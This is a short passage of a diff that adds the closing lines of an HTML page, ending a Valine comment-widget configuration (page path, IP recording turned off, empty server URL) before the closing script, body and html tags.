+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
